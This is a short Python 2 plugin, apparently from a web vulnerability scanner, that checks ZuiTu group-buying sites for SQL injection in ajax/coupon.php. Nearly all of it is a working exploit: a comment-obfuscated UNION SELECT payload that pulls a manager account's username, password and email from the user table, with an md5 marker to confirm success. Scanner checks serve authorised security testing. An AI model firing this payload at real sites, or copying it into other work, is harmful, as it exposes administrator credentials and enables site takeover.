#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "ajax/coupon.php?action=consume&secret=8&id=2%27)/**/and/**/1=2/**/union/**/select/**/1,2,0,4,5,6,concat(0x31,0x3a,username,0x3a,password,0x3a,email,0x3a,md5(333),0x3a),8,9,10,11,9999999999,13,14,15,16/**/from/**/user/**/where/**/manager=0x59/**/limit/**/0,1%23"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('310dcbbf4cce62f762a2aaa148d556bd')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:ZuiTu_ajax_coupon_SqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:ZuiTu_ajax_coupon_SqlInjectionScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
